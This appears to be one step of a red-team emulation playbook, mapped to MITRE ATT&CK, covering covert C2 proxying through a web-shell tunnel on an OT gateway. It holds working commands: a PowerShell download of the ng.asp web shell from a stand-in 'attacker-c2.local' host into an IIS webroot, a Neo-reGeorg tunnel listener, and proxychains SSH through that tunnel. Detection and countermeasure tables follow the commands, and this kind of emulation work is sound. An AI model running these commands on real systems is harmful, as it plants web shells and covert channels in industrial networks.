# Step 6: Internal Proxy & Covert Comms

**Tactic**: Command and Control [TA0011]  
**Technique**: Proxy [T1090]

---

**Objective**  
Deploy an internal web shell-based tunnel (Neo-reGeorg) on a compromised OT system to route command-and-control traffic from internal subnets covertly through the OT-IT boundary. This simulates lateral infrastructure pivoting and egress over authorized channels.

---

**Execution**  
1. Identify OT system with HTTP/HTTPS access to IT subnet (e.g., `ot-gw-win-001`)

2. Use WMI or `Invoke-Command` to upload and deploy Neo-reGeorg tunnel:
   ```powershell
   Invoke-Command -ComputerName "ot-gw-win-001" -ScriptBlock {
     Invoke-WebRequest -Uri "http://attacker-c2.local/ng.asp" -OutFile "C:\inetpub\wwwroot\ng.asp"
   }
   ```

3. Establish SSH-based listener (external operator system):
   ```bash
   python neo-reGeorg.py --URL http://10.20.5.45/ng.asp --LPORT 1080
   ```

4. Validate tunnel connectivity using proxychains or routed SSH:
   ```bash
   proxychains ssh user@10.2.15.206
   ```

5. Relay additional WMI/SMB commands through tunnel for remote access persistence

---

**Result**  
An HTTP-based tunnel now relays traffic from the internal OT system to IT systems, providing covert C2 channel for lateral movement or data staging.

---

**Detection Opportunities**

| Vector | Description |
|--------|-------------|
| OT to IT Traffic | OT systems initiating outbound connections to IT segment (unusual) |
| Tunneling Patterns | HTTP requests with long URIs or consistent polling intervals |
| Parent Processes | `w3wp.exe`, `python.exe`, or `powershell.exe` child processes on OT endpoints |

---

**Defensive Countermeasures**

- Kill the web shell/tunnel process on OT system
- Block outbound HTTP/HTTPS from OT subnet via firewall or DPI
- Monitor OT endpoints for the presence of script interpreters (PowerShell, Python, etc.)
- Enforce deny-all egress policy on OT unless explicitly approved
- Deploy DPI sensors at OT/IT boundary to detect HTTP beaconing or tunnels

---

**Assets Involved**  
- OT Host: `ot-gw-win-001`  
- VPN Bridge & Internal C2 Infrastructure  
- Tools: `neo-reGeorg.py`, `Invoke-WebRequest`, `proxychains`, `ssh`
